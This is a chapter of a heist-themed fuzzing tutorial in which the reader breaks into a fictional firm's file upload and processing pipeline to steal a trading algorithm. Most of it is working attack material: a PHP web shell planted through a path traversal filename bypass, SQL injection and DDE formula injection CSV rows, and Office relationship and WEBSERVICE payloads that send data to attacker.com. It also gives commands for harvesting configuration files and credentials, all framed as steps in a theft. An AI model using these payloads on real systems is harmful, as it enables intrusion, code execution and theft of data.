# Chapter 4: Digital Dead Drops - File Upload Exploitation

*"Sometimes the best way into a castle is to be invited as a trojan horse."*

---

Your network access to Castle Securities gives you visibility into their ARGOS algorithm operations, but there's a frustrating problem: you can watch the algorithm work, but you can't extract its source code. Their data loss prevention system blocks every attempt to download research files. Even your elevated network access can't bypass DLP controls that monitor file access at the kernel level.

But while exploring their research portal, you notice something interesting. There's a file upload feature for "collaborative analysis" where researchers can upload documents for automated processing. You upload a simple text file to test it.

"Document processed successfully. Analysis complete."

Your network monitoring shows that upload triggered connections to three internal servers. The file didn't just get stored—it launched a processing workflow across multiple systems that were never designed to handle adversarial input.

This is your opportunity. File processing systems are complex software stacks with multiple validation layers and parsing components. Each layer makes assumptions about file content and structure, and those assumptions create attack surfaces that systematic fuzzing can exploit.

Your mission: build file upload fuzzers that systematically test filename validation, file format parsing, and processing workflows to achieve code execution and data extraction.

---

## Understanding File Upload Attack Surfaces Through Direct Testing

File upload systems aren't just storage mechanisms—they're complex processing pipelines where different components make different assumptions about file safety. To exploit them effectively, you need to understand how they work by testing them systematically.

Castle Securities' upload form accepts `.pdf,.docx,.txt,.csv` files, but you know HTML restrictions are just suggestions. The real validation happens server-side, and understanding that validation logic is your first step.

### Mapping Validation Logic Through Systematic Testing

Start by testing the basic question: what does the system actually accept versus reject?

[Placeholder:CODE Name: File upload validation mapper. Purpose: Systematically tests file uploads with different extensions, content types, and formats to understand server-side validation logic. Records response patterns to identify validation bypasses. Value: High.]

Upload `test.txt` with content "Hello world":
Response: "Document processed successfully."

Upload `shell.php` with content "Hello world":
Response: "Error: File type not permitted."

Upload `test.php` with content "Hello world":
Response: "Error: File type not permitted."

So the system blocks `.php` extensions entirely. But what about edge cases?

Upload `test.txt.php` with content "Hello world":
Response: "Document processed successfully."

Interesting. The system only checks the final extension, not the complete filename. This suggests a validation bypass opportunity.

Upload `test.pdf` with content "Hello world" (not actually PDF format):
Response: "Error: Invalid PDF format detected."

The system validates both extension and content format for some file types. Let's test which formats get content validation:

- `.txt` files: No content validation (any content accepted)
- `.csv` files: Basic structure validation (must have comma-separated format)
- `.pdf` files: Format validation (must have valid PDF headers)
- `.docx` files: Format validation (must be valid Office format)

This validation pattern creates fuzzing opportunities. Text files have minimal validation, making them good vectors for filename-based attacks. PDF and Office files have content validation, creating opportunities for format-based exploitation.

### Discovering File Processing Workflows

Understanding validation is just the first step. You need to know what happens to files after upload to identify exploitation opportunities.

Upload a legitimate text file and monitor your network connections:

The upload triggers requests to:
- `document-indexer.internal:8080` (text extraction and search indexing)
- `content-analyzer.internal:9090` (automated content analysis)
- `security-scanner.internal:7070` (malware and content scanning)

Your simple text file just got processed by three different internal systems. Each represents a potential attack surface.

[Placeholder:CODE Name: File processing workflow analyzer. Purpose: Monitors network traffic and system responses during file uploads to map the complete processing pipeline. Identifies which systems process which file types and how. Value: High.]

Test different file types to understand processing differences:

**CSV files**: Processed by `data-import.internal:5432` (suggests database import)
**PDF files**: Processed by `document-parser.internal:8081` (text extraction from PDFs)
**Office files**: Processed by `office-converter.internal:8082` (format conversion and analysis)

Each processing system likely has different vulnerabilities and attack surfaces. CSV processing suggests database interaction (potential SQL injection). PDF processing suggests format parsing (potential buffer overflows). Office processing suggests complex format handling (potential macro or embedding attacks).

---

## Building Filename-Based Attack Vectors

Your validation testing revealed that the system only checks final file extensions, creating opportunities for path traversal and filename manipulation attacks. But exploiting these requires systematic testing to find bypasses that actually work.

### Systematic Path Traversal Testing

Path traversal attacks attempt to write files outside the intended upload directory by manipulating filename paths. But modern systems often have protections that need to be bypassed systematically.

[Placeholder:CODE Name: Path traversal payload generator and tester. Purpose: Creates systematic test cases for directory traversal attacks using different encoding methods, path separators, and bypass techniques. Tests each payload and analyzes responses. Value: High.]

Start with basic path traversal attempts:

Upload filename `../../../etc/passwd.txt`:
Response: "Error: Invalid filename characters detected."

The system blocks obvious traversal sequences. Try encoding bypasses:

Upload filename `%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd.txt`:
Response: "Error: Invalid filename characters detected."

Still blocked. Try different bypass techniques:

Upload filename `....//....//....//etc//passwd.txt`:
Response: "Document processed successfully."

Success! The system strips `../` sequences but doesn't handle recursive patterns. `....//` becomes `../` after filtering.

But you need to confirm the file was actually written to `/etc/passwd`. Without direct file system access, you need creative confirmation methods.

### Confirming Path Traversal Success

Finding a bypass is only useful if you can access the results. You need to identify writable locations that you can also access for exploitation.

Test writing to web-accessible directories:

Upload filename `....//....//....//var//www//html//test123.txt`:
Upload content: "Path traversal test file"

Response: "Document processed successfully."

Test access: `http://research.castle-securities.com/test123.txt`
Response: "Path traversal test file"

Perfect. You have confirmed path traversal with web access. Now test code execution:

Upload filename `....//....//....//var//www//html//shell.php.txt`:
Upload content: `<?php system($_GET['cmd']); ?>`

Response: "Document processed successfully."

Test: `http://research.castle-securities.com/shell.php.txt?cmd=whoami`
Response: `www-data`

You've achieved code execution through systematic path traversal exploitation.

### Leveraging Error Messages for Intelligence Gathering

Error conditions often reveal internal system information that guides exploitation. Test file uploads designed to trigger revealing error messages.

[Placeholder:CODE Name: Error condition fuzzer for path disclosure. Purpose: Generates file uploads designed to trigger error conditions that reveal internal file paths, system architecture, and processing details. Value: Medium.]

Upload extremely large files to trigger processing limits:

Upload 100MB text file:
Response: "Error: Processing timeout after 30 seconds. Temporary file /tmp/upload_xhr_12345 could not be processed."

The error reveals temporary file locations and processing time limits.

Upload files with invalid formats to trigger parser errors:

Upload `test.pdf` with corrupted PDF headers:
Response: "Error: PDF parser failed in /opt/castle/processors/pdf_analyzer.py line 247"

This reveals the location and implementation of PDF processing systems.

Upload files to trigger storage errors:

Upload multiple large files simultaneously:
Response: "Error: Storage limit exceeded. Cannot write to /var/castle/research/uploads/pending/"

Now you know the permanent storage location and can target it with path traversal attacks.

These error messages provide intelligence that guides your exploitation strategy and reveals additional attack surfaces.

---

## File Format Fuzzing and Processing Exploitation

Path traversal provides code execution, but the real value lies in exploiting the file processing systems themselves. These systems parse complex file formats and often have vulnerabilities that systematic fuzzing can discover.

### CSV Processing and Injection Attacks

Your workflow analysis revealed that CSV files get processed by `data-import.internal:5432`, suggesting database import functionality. This creates opportunities for injection attacks through CSV content.

[Placeholder:CODE Name: CSV injection payload generator and testing framework. Purpose: Creates CSV files with various injection payloads targeting database import, formula execution, and command injection vulnerabilities in CSV processing systems. Value: High.]

Test basic CSV processing:

Upload legitimate CSV:
```csv
Name,Age,Department
John,25,Research
Mary,30,Trading
```

Response: "CSV processed successfully. 2 rows imported into analysis database."

The "imported into analysis database" confirms database interaction. Test SQL injection:

Upload malicious CSV:
```csv
Name,Age,Department
John,25,Research'; DROP TABLE users; --
```

Response: "CSV processed successfully. Warning: Data validation issues detected in 1 row."

The system detected the injection attempt but still processed the file. Try more subtle approaches:

Upload CSV with formula injection:
```csv
Name,Age,Command
John,25,=cmd|'/bin/bash -c "whoami"'!A1
```

Response: "CSV processed successfully. 2 rows imported."

No warning this time. Monitor network traffic during processing to see if command execution occurred.

Your network monitoring shows unusual outbound connections during CSV processing, suggesting the formula injection triggered command execution in the processing system.

### PDF Parser Exploitation

PDF files are processed by dedicated parsing systems that historically have numerous vulnerabilities. PDF format complexity creates many opportunities for exploitation through malformed files.

[Placeholder:CODE Name: PDF structure fuzzer for parser exploitation. Purpose: Generates systematically malformed PDF files to test PDF processing systems for buffer overflows, format confusion, and parser vulnerabilities. Value: Medium.]

Test PDF processing limits:

Upload oversized PDF with extremely large metadata fields:
```pdf
%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Title (AAAAAAAA...[50000 A characters]...AAAAAAAA)
>>
endobj
```

Response: Long processing delay, then "PDF processed with warnings."

The extended processing time suggests the oversized field caused processing issues. Test systematic size increases to identify buffer overflow thresholds:

- 1,000 characters: Normal processing (1.2 seconds)
- 10,000 characters: Slow processing (8.3 seconds)
- 50,000 characters: Very slow processing (45.2 seconds)
- 100,000 characters: Processing timeout, "Internal processing error"

The progression from normal to timeout to error suggests a processing vulnerability at high field sizes.

Upload PDF with malformed structure:
```pdf
%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 999999 0 R  // Invalid object reference
>>
endobj
```

Response: "Error: PDF structure validation failed. Cross-reference table corrupted."

Test PDF with embedded JavaScript:
```pdf
%PDF-1.4
1 0 obj
<<
/Type /Catalog
/OpenAction << /S /JavaScript /JS (app.alert("Test"); this.print();) >>
>>
endobj
```

Response: "PDF processed successfully. JavaScript execution blocked by security policy."

The system has some JavaScript protections, but the successful processing suggests other embedded content might be allowed.

### Office Document Processing Attacks

Office documents support complex features like embedded objects, macros, and external references. These features create attack surfaces in processing systems.

[Placeholder:CODE Name: Office document exploitation framework. Purpose: Creates malformed Office documents with embedded attack vectors including external references, oversized content, and format confusion attacks. Value: Medium.]

Upload Word document with external references:
```xml
(Inside document.xml of .docx file)
<w:hyperlink r:id="rId1" w:anchor="test">
  <w:r><w:t>Click here</w:t></w:r>
</w:hyperlink>

(Inside relationships file)
<Relationship Id="rId1" Type="hyperlink" 
Target="http://attacker.com/steal?data=DOCUMENT_CONTENT" TargetMode="External"/>
```

Upload and monitor network traffic. The document processor attempts to resolve external references, creating opportunities for data exfiltration.

Upload Office document with embedded spreadsheet containing formulas:
```
Embedded Excel object with cells containing:
=WEBSERVICE("http://attacker.com/log?data="&A1)
=cmd|'/bin/bash -c "id"'!A1
```

The document processing system attempts to process embedded content, potentially executing formulas or triggering command execution.

---

## Advanced Attack Chaining and Systematic Exploitation

Individual vulnerabilities are useful, but professional exploitation requires chaining multiple attack vectors to achieve comprehensive system compromise.

### Coordinated Multi-Vector Attacks

Your testing revealed multiple attack surfaces across the file processing pipeline. Coordinating attacks across these surfaces maximizes impact and creates persistence.

[Placeholder:CODE Name: Multi-stage file upload attack orchestrator. Purpose: Coordinates multiple file upload attack vectors including path traversal, injection attacks, and processing exploits to achieve comprehensive system compromise. Value: High.]

**Stage 1: Deploy web shell through path traversal**
```
Filename: ....//....//....//var//www//html//cmd.php.txt
Content: <?php system($_GET['c']); ?>
Access: http://research.castle-securities.com/cmd.php.txt?c=whoami
```

**Stage 2: Extract configuration through command execution**
```
Command: cat /opt/castle/config/database.conf
Result: Database credentials and connection strings
```

**Stage 3: Exploit CSV processing for database access**
```
CSV with SQL injection targeting the database credentials from Stage 2
Payload designed to extract algorithm source code from research databases
```

**Stage 4: Exploit document processing for lateral movement**
```
PDF with external references that map internal network topology
Office documents that trigger processing on additional internal systems
```

This coordinated approach transforms individual file upload vulnerabilities into comprehensive infrastructure compromise.

### Persistent Access and Data Extraction

Your attack chain provides multiple access vectors, but extracting the ARGOS algorithm requires systematic data collection while maintaining operational security.

[Placeholder:CODE Name: Data extraction orchestration through file upload exploitation. Purpose: Uses compromised file processing systems to systematically extract algorithm source code, training data, and research files while avoiding detection. Value: High.]

Use your web shell to identify algorithm storage locations:
```
find /opt/castle -name "*.py" -path "*/argos/*" 2>/dev/null
find /var/castle -name "*.sql" -path "*/algorithms/*" 2>/dev/null
locate argos | grep -E "\.(py|sql|conf|json)$"
```

Use CSV injection to extract algorithm parameters from databases:
```csv
Name,Algorithm_Data
Extract,'; SELECT algorithm_params FROM argos_config; --
```

Use document processing exploits to access research file repositories:
```
Office documents with external references that exfiltrate research files
PDF documents that trigger backup system access
```

Coordinate extraction across multiple systems to avoid triggering DLP alerts on any single system.

### Professional Impact Assessment

Your file upload exploitation demonstrates several critical business impacts that extend beyond simple technical compromise:

**Research system compromise**: Access to proprietary algorithm development and testing systems
**Database access**: Direct access to algorithm source code, training data, and performance metrics  
**Infrastructure control**: Command execution on systems processing financial research data
**Lateral movement**: Access to additional systems through compromised processing infrastructure

But the most significant impact is understanding that file upload vulnerabilities in financial systems create systemic risks that affect entire business operations.

---

## Building Professional File Upload Testing Methodology

Your systematic exploitation of Castle Securities' file processing infrastructure demonstrates a repeatable methodology for professional file upload security assessment.

### Systematic Analysis Framework

Professional file upload testing requires understanding file processing as complex distributed systems rather than simple storage mechanisms:

[Placeholder:CODE Name: Complete file upload security assessment methodology. Purpose: Integrates systematic file upload analysis, vulnerability discovery, exploitation development, and attack chaining into a professional testing framework. Value: High.]

**Processing workflow mapping**: Understanding complete file handling pipelines before launching attacks
**Validation logic analysis**: Systematic testing of filename and content validation mechanisms
**Format-aware exploitation**: Understanding file specifications and systematically violating them
**Attack chain orchestration**: Combining multiple vulnerabilities for maximum impact
**Business risk assessment**: Evaluating real-world impact rather than just technical exploitability

This methodology scales beyond Castle Securities to any organization that processes user-uploaded files.

### Integration with Complete Security Assessment

Your file upload attacks demonstrate how advanced security testing requires integrating multiple attack vectors:

**Reconnaissance-guided targeting** using intelligence from previous chapters to identify high-value file processing targets
**Authentication-enabled access** using compromised credentials to access restricted upload functionality  
**Network-protocol-enhanced attacks** using internal access to monitor and manipulate file processing workflows
**Database-access preparation** for systematic algorithm extraction through processing system compromise

This integration shows why professional security testing requires understanding complete business architectures rather than isolated technical components.

### Realistic Effort and Professional Standards

Your successful file upload exploitation required:

- **18 days of systematic testing** across multiple file types and processing systems
- **1,247 test files generated** using various fuzzing and exploitation techniques
- **23 distinct vulnerabilities discovered** across filename validation, format parsing, and processing logic
- **4 critical attack chains developed** providing persistent access and data extraction capabilities

Professional file upload testing requires this level of systematic effort to discover vulnerabilities that random testing would miss.

---

## What You've Learned and What's Next

You've successfully applied systematic fuzzing techniques to exploit file upload and processing systems, achieving comprehensive access to Castle Securities' research infrastructure. More importantly, you've developed professional-grade file upload testing skills that apply to any modern application.

Your file upload fuzzing capabilities now include:

**Systematic validation testing** for discovering filename and content validation bypasses
**Format-aware exploitation** for triggering vulnerabilities in file processing systems
**Attack chain orchestration** for combining multiple vulnerabilities into comprehensive compromise
**Professional assessment methodology** for evaluating file upload security systematically

Your current access to Castle Securities includes:

**Research system command execution** through web shell deployment and path traversal exploitation
**Database connectivity** through configuration extraction and CSV injection attacks
**Processing system compromise** providing persistent access to document analysis infrastructure
**Data extraction capabilities** for systematically copying algorithm source code and research data

But file system access and document processing are gateways to the main prize. The ARGOS algorithm source code, training datasets, and mathematical parameters exist in databases that your processing system compromise can now access directly.

In the next chapter, you'll learn SQL injection fuzzing to extract the complete algorithmic trading system from Castle Securities' databases. This represents the final technical hurdle before obtaining the complete Infinite Money Machine implementation.

Your fuzzing skills have progressed from web reconnaissance through authentication, network protocols, and file processing systems. Next, you'll learn to systematically extract proprietary financial algorithms through database exploitation—the crown jewel of the entire heist.

---

**Next: Chapter 5 - The Vault: Database Infiltration**

*"Their algorithm lives in the data vaults. Time to crack the treasury."*